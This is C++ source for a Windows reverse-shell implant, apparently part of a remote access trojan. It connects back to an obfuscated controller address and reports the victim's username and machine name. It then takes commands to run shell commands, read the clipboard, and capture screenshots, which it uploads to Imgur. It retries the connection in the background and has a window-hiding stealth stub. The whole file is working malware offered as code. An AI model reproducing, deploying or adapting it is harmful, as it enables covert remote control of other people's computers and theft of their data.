#include "Utils.h"

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

PCSTR hostServer = (PCSTR)OBFUSCATE("127.0.0.1");
u_short hostServerPort = 5532;

void RevShell()
{
    SetThreadPriority(GetCurrentThread(), THREAD_MODE_BACKGROUND_BEGIN);

    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, hostServer, &(addr.sin_addr.s_addr));
    addr.sin_port = htons(hostServerPort);

    char commandReceived[DEFAULT_BUFLEN] = "";

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        Sleep(30000);
        RevShell();
    }
    else {        
        std::string pcUsernameBuffer = Utils::getUsername();
        std::string pcNameBuffer = Utils::getMachineName();
        std::string combinedStr = pcUsernameBuffer + pcNameBuffer;

        Utils::sendToServer(tcpsock, combinedStr.c_str());
        while (true)
        {
            int size = recv(tcpsock, commandReceived, DEFAULT_BUFLEN, 0);

            if ((strcmp(commandReceived, "whoami") == 0)) {
                Utils::sendToServer(tcpsock, combinedStr.c_str());
            }
            else if ((strcmp(commandReceived, "getClipboard") == 0)) {
                Utils::sendToServer(tcpsock, Utils::getClipboardText().c_str());
            }
            else if ((strcmp(commandReceived, "screenshot") == 0)) {
                std::string base64string = Utils::getScreenshotBase64();
                std::string returnString = Utils::uploadToImgur(base64string);
                Utils::sendToServer(tcpsock, returnString.c_str());
            }
            else if ((std::string(commandReceived).rfind("shell", 0) == 0)) {
                std::string answer = Utils::executeCommand(commandReceived);
                Utils::sendToServer(tcpsock, answer.c_str());
            }
            else if ((std::string(commandReceived).rfind("download", 0) == 0)) {

            }
            else if ((strcmp(commandReceived, "quit") == 0)) {
                closesocket(tcpsock);
                WSACleanup();
                Sleep(15000);
                RevShell();
            }
            else {}

            // reset buffer
            memset(commandReceived, 0, sizeof(commandReceived));
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth, SW_SHOWNORMAL);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    RevShell();
    return 0;
}